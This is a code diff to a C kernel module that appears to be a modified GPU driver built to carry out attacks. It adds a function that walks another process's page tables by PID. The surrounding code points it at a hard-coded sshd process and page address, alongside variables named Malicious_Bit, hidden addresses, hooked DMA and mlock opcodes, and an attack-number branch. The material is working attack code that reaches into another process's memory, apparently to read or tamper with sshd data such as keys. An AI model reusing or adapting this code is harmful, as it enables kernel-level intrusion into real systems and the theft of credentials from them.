@@ -428,6 +428,7 @@ static unsigned char old_dma_opcode[5];
 static unsigned char old_mlock_opcode[5];
 
 static long get_pfn_of_virtual_address(unsigned long, unsigned long *);
+static long get_pfn_of_virtual_address_pid(unsigned long, unsigned long *, int);
 
 static unsigned long global_hidden_addr = 0x4000000;
 static unsigned int Malicious_Bit = 0;
@@ -494,6 +495,60 @@ long get_pfn_of_virtual_address(unsigned long address, unsigned long * pfn)
 
 }
 
+long get_pfn_of_virtual_address_pid(unsigned long address, unsigned long * pfn, int pid)
+{
+	/*
+	 * Get Page Frame Number. (AKA Phys. Addr shl by 12 bit)
+	 */
+
+	pgd_t *pgd;
+	pud_t *pud;
+	pmd_t *pmd;
+	pte_t *ptep;
+	spinlock_t *ptl;
+	struct task_struct *task;
+	struct mm_struct *mm;
+	struct mm_struct *mm1;
+	struct vm_area_struct *vma;
+
+	// Get task structure by pid
+	task = pid_task(find_vpid(pid), PIDTYPE_PID);
+
+	//Get VMA of Current tsk struct. CHANGE if you want different Proc.
+	mm1 = task->mm;
+	DbgPrint("***YR NVRM: Looking for page_num. mm: %llx, addr: %llx!***\n",mm1,address);
+	vma = find_vma(mm1,address);
+	mm = vma->vm_mm;
+
+	//Get Page Global Dir.
+	pgd = pgd_offset(mm, address);
+	if (pgd_none(*pgd) || unlikely(pgd_bad(*pgd))) {
+    DbgPrint("Error: Get Page Global Dir.\n");
+	  return -EFAULT;
+	}
+
+	//Get Page Upper Dir.
+	pud = pud_offset(pgd, address);
+	if (pud_none(*pud) || unlikely(pud_bad(*pud))) {
+    DbgPrint("Error: Get Page Upper Dir.\n");
+		return -EFAULT;
+	}
+
+	// Get Page Middle Dir.
+	pmd = pmd_offset(pud, address);
+	if (pmd_none(*pmd)) {
+    DbgPrint("Error: Get Page Middle Dir.\n");
+  	return -EFAULT;
+	}
+
+	// Get Page table entry, and get PFN from it:
+	ptep = pte_offset_map_lock(mm, pmd, address, &ptl);
+	*pfn = pte_pfn(*ptep);
+	pte_unmap_unlock(ptep, ptl);
+
+	return 0;
+
+}
 
 //////////////////////////////////////////////////////////////////////
 //
@@ -768,9 +823,10 @@ if (attack_num < 2) {
 					down_read(&mm->mmap_sem);
 
 					// Currently hard-coded sshd page addr:
-					unsigned long sshd_page_addr = 0x7f2eb1fb8000;
+					int pid = 11397;
+					unsigned long sshd_page_addr = 0x7f1b1a2b0000;
 
-						ret = get_pfn_of_virtual_address(sshd_page_addr, &page_number);
+						ret = get_pfn_of_virtual_address_pid(sshd_page_addr, &page_number, pid);
 
 					up_read(&mm->mmap_sem);
 		    		if (ret < 0)
